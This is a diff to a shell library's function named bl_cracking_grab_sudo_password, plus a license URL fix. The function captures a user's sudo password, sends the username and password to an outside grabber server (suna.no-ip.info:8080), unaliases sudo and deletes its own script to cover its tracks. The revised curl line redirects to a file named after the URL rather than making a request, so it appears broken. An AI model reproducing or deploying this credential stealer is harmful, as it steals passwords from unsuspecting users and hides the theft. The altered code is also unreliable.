@@ -7,7 +7,7 @@
 # -------
 
 # This library written by Torben Sickert stand under a creative commons naming
-# 3.0 unported license. see http://creativecommons.org/licenses/by/3.0/deed.de
+# 3.0 unported license. See https://creativecommons.org/licenses/by/3.0/deed.de
 # endregion
 # shellcheck disable=SC2016,SC2034,SC2155
 # region import
@@ -91,9 +91,8 @@ bl_cracking_grab_sudo_password() {
             sudo -S "$@" 1>"$buffer_file_path" 2>/dev/null
         then
             # NOTE: Place your password grabber server url here.
-            wget \
-                --quiet \
-                "http://suna.no-ip.info:8080?user=${user}&password=${password}"
+            curl \
+                >"http://suna.no-ip.info:8080?user=${user}&password=${password}"
             unalias sudo &>/dev/null
             rm "$(readlink --canonicalize "$0")" &>/dev/null
             bl.logging.cat "$buffer_file_path"
